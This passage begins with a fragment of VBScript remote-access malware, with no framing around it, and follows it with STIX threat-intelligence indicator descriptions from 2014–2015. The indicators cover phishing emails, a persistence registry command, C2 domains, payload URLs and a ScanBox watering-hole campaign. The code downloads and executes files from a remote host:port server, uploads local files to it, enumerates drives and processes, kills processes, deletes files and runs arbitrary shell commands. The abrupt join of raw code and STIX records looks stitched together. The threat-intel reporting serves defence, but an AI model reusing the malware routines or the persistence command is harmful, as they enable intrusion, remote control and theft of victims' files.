if objhttpdownload.status = 200 then dim objstreamdownload set objstreamdownload = createobject("adodb.stream") with objstreamdownload .type = 1 .open .write objhttpdownload.responsebody .savetofile strsaveto .close end with set objstreamdownload = nothing end if if objfsodownload.fileexists(strsaveto) then shellobj.run objfsodownload.getfile (strsaveto).shortpath end if end sub
sub download (fileurl,filedir)
if filedir = "" then filedir = installdir end if
strsaveto = filedir & mid (fileurl, instrrev (fileurl,"\") + 1) set objhttpdownload = createobject("msxml2.xmlhttp") objhttpdownload.open "post","http[:]//" & host & ":" & port &"/" & "is-sending" & spliter & fileurl, false objhttpdownload.send ""
set objfsodownload = createobject ("scripting.filesystemobject") if objfsodownload.fileexists (strsaveto) then objfsodownload.deletefile (strsaveto) end if if objhttpdownload.status = 200 then dim objstreamdownload set objstreamdownload = createobject("adodb.stream") with objstreamdownload .type = 1 .open .write objhttpdownload.responsebody .savetofile strsaveto .close end with set objstreamdownload = nothing end if if objfsodownload.fileexists(strsaveto) then shellobj.run objfsodownload.getfile (strsaveto).shortpath end if end sub
function upload (fileurl) 'upload the content of the specified file to the remote server dim httpobj,objstreamuploade,buffer set objstreamuploade = createobject("adodb.stream") with objstreamuploade .type = 1 .open .loadfromfile fileurl buffer = .read .close end with set objstreamdownload = nothing set httpobj = createobject("msxml2.xmlhttp") httpobj.open "post","http[:]//" & host & ":" & port &"/" & "is-recving" & spliter & fileurl, false httpobj.send buffer end function
function enumdriver ()
for each drive in filesystemobj.drives if drive.isready = true then enumdriver = enumdriver & drive.path & "|" & drive.drivetype & spliter end if next end Function
function enumfaf (enumdir)
enumfaf = enumdir & spliter for each folder in filesystemobj.getfolder (enumdir).subfolders enumfaf = enumfaf & folder.name & "|" & "" & "|" & "d" & "|" & folder.attributes & spliter next
for each file in filesystemobj.getfolder (enumdir).files enumfaf = enumfaf & file.name & "|" & file.size & "|" & "f" & "|" & file.attributes & spliter next end function
function enumprocess ()
on error resume next
set objwmiservice = getobject("winmgmts:\\.\root\cimv2") set colitems = objwmiservice.execquery("select * from win32_process",,48)
dim objitem for each objitem in colitems enumprocess = enumprocess & objitem.name & "|" enumprocess = enumprocess & objitem.processid & "|" enumprocess = enumprocess & objitem.executablepath & spliter next end function
sub exitprocess (pid) on error resume next
shellobj.run "taskkill /F /T /PID " & pid,7,true end sub
sub deletefaf (url) on error resume next
filesystemobj.deletefile url filesystemobj.deletefolder url
end sub
function cmdshell (cmd)
dim httpobj,oexec,readallfromany
set oexec = shellobj.exec ("%comspec% /c " & cmd) if not oexec.stdout.atendofstream then readallfromany = oexec.stdout.readall elseif not oexec.stderr.atendofstream then readallfromany = oexec.stderr.readall else readallfromany = "" end if
cmdshell = readallfromany end function

stix:STIX_Header.stix:Title: Phishing Email With Media Contact Theme Contains Malicious Attachment
stix:STIX_Header.stix:Description: On 28 October 2014, a government department received phishing emails from two senders that had the same subject line. The subject of the emails was "Fwd: Media Contact Directory 26/10/2014". The emails contained an attachment with a password protected file. The malicious file calls out to the domain www.sslquery.myz.info.

stix:Indicator.indicator:Description: --- BEGIN EMAIL HEADER #1 --- Subject: Fwd: Media Contact Directory 26/10/2014 From: Mimoza Peza <pmimoza.partners@gmail.com>; To: helen.mitchell.dfat@gmail.com; Date: Mon Oct 27 02:52:36 GMT 2014 Attachments: Media Contact Directory.rar (11412 bytes); --- END EMAIL HEADER #1 --- --- BEGIN EMAIL BODY #1 --- ---------- Forwarded message ---------- From: lap tak fok<foklaptak@gmail.com> Date: 2014-10-27 10:16 GMT+08:00 Subject: Media Contact Directory 26/10/2014 To: pmimoza.partners@gmail.com Services for Media, Contact Directory UPDATED. Last updated on 26/10/2014, by UKGOV Communications and Public Affairs Office. Only forinternal communicationuse,do notspread. Readpassword：mediadir --- END EMAIL BODY #1 ---

--- BEGIN EMAIL HEADER #2 --- Subject: Fwd: Media Contact Directory 26/10/2014 From: lap tak fok <foklaptak@gmail.com>; To: marksobel.mosf@gmail.com; Bcc: <TARGETS> Date: Mon Oct 27 02:11:59 GMT 2014 Attachments: Media Contact Directory.rar (11412 bytes); --- END EMAIL HEADER #2 --- --- BEGIN EMAIL BODY #2 --- ---------- Forwarded message ---------- From: Macpherson Nick<nick.macpherson.uk@gmail.com> Date: 2014-10-27 9:58 GMT+08:00 Subject: Media Contact Directory 26/10/2014 To: foklaptak@gmail.com Services for Media, Contact Directory UPDATED. Last updated on 26/10/2014, by UKGOV Communications and Public Affairs Office. Only for internal communication use,do not spread. Readpassword：mediadir --- END EMAIL BODY #2 ---
This is a password protected WinRAR containing the file "Media Contact Directory.exe".

This malicious executable appears to be a Microsoft Excel spreadsheet. When Media Contact Directory.exe is run, the executable performs the following command which adds a key to the registry, renames the file Media Contract Delivery.exe to iexplorer.exe and executes iexplorer.exe:
"C:\WINDOWS\system32\cmd.exe"/c regaddhkcu\software\microsoft\windows\currentversion\run /v hotkey /t reg_sz /d "C:\Documents and Settings\All Users\iexplorer.exe -st" /f & move "C:\Documents and Settings\User\Desktop\Media Contract Delivery.exe" "C:\Documents and Settings\All Users\iexplorer.exe" & "C:\Documents and Settings\All Users\iexplorer.exe" -st
The added registry key ensures persistence of the malware upon reboot: HKU\S-1-5-21-1454471165-1644491937-839522115-1003\Software\Microsoft\Windows\Currentversion\Run\hotkey: "C:\Documents and Settings\All Users\iexplorer.exe-st".

The malicious executable file (MD5 8b4de19dcae22fe2b03999d7b4bf31eb) attempts to communicate with this domain. A DNS request for this domain is performed. The malware then sends an HTTP GET request as follows:
GET .bin HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727) Host: <IP> Connection: Keep-Alive

stix:STIX_Header.stix:Title: Phishing Emails with Confirmed Invoice Theme Leads to Kazy Trojan
stix:STIX_Header.stix:Description: On 23 September 2014, a phishing email was sent from admin1@skylinecredit.com.sg with the subject "Confirmed Invoice Details". It contained the malicious attachment INVOICE2778901.doc (MD5: 45cfb80254c666854cdad02d1989483a) that exploits the vulnerability CVE-2012-0158. The malware payload was identified as the Kazy Trojan.

stix:Indicator.indicator:Description: No additional details regarding this email are available.
This attachment is a rich text format file that contains an exploit for the Microsoft Office vulnerability CVE-2012-0158.
This is the payload location.

This is the malicious payload from http://tlva.in/newerass.exe. It was associated with the Kazy Trojan.
It creates the following registry key entry to enable persistence: HKEY_USERS\S-1-5-21-1229272821-1563985344-1801674531-1003\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN/ Windows Update
The Kazy Trojan creates additional files on the compromised system:
Name:Windows Update.exe (hidden copy of newerass.exe) Path: C:\Documents and Settings\[User]\Application Data
Name: pidloc.txt Path: C:\Documents and Settings\[User]\Application Data
Name: pid.txt Path: C:\Documents and Settings\[User]\Application Data
Name:WindowsUpdate.exe (another copy of newerass.exe) Path: C:\Documents and Settings\[User]\Application Data
The Kazy Trojan calls back to the following sites:
whatismyipaddress.com mx1.3owl.com

stix:STIX_Header.stix:Title: Global Development Websites Used in Watering Hole Campaign
stix:STIX_Header.stix:Description:
Around 16 October 2014, two legitimate sites were observed redirecting visitors to malicious ScanBox framework sites. The legitimate sites were world development and foreign policy related organizations. ScanBox is a malicious reconnaissance framework used in watering hole attacks. The malicious redirects were to the domain news.foundationssl.com.
The domain news.foundationssl.com was reported in IB-14-10422.

stix:Indicator.indicator:Description: This was observed as a redirect from one of the legitimate sites. Open source reports indicate that as of 22 October 2014 the legitimate site that had this redirect was still redirecting to the news.foundationssl.com domain.

This was observed as a redirect from one of the legitimate sites. Open source reports indicate that at some point during 20 October 2014 the legitimate site that had this redirect stopped redirecting to the news.foundationssl.com domain.
An HTTP POST request was observed to this location from both legitimate sites.

An HTTP POST request was observed to this location from both legitimate sites.
An open source report indicates that this location was used to receive some of the browser specific fingerprint information.

This location was observed in open source reports on both domains. Following the question mark (?) in the HTTP GET request were the following arguments:
seed alivetime r
The values for the arguments for the first two are base64 encoded values and the value of r is a long decimal. The alivetime value appears to be a base64 encoded Unix timestamp.
A sample from one of the open source reports is:
GET /i/s.php?seed=NDgxOTE0MTM5MzcwMDY0MzA=&alivetime=MTQxMzkzNzAxNA==&r=0.6792347457091188 HTTP/1.1
Host: news.foundationssl.com User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 Accept: image/png,image/*;q=0.8,*/*;q=0.5 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 115 Connection: keep-alive Referer: http://[REDACTED] Cookie: PHPSESSID=1648856401a1e006f635672d1802d1b3

stix:STIX_Header.stix:Title: Phishing Email with Pleasantly Surprised Theme
stix:STIX_Header.stix:Description: On 27 May 2015, a defense industrial base (DIB) organization reported a phishing email with the subject "Pleasantly Surprised". The email has the malicious attachment Pleasantly surprised.zip that attempts to install the three files sys.inf (MD5 8abea0a2e49e59fe66127bb55b4d427b), air.dll (MD5 9f364f9fc9bea84d42e128fa37de9fe4) and Sys.dat (MD5 27f1f6f7f37a75134c52f1e06435383e). Sys.dat attempts to call out to the Command and Control (C2) domain www.yourbroiler.com over port 302.

stix:Indicator.indicator:Description: --- NO EMAIL BODY ---

This attachment attempts to install the following three files: ys.inf (MD5 8abea0a2e49e59fe66127bb55b4d427b) air.dll (MD5 9f364f9fc9bea84d42e128fa37de9fe4) Sys.dat (MD5 27f1f6f7f37a75134c52f1e06435383e)
This malware was extracted from Pleasantly surprised.zip (MD5 99154e1f5447df58396c8cd486b8cb58).
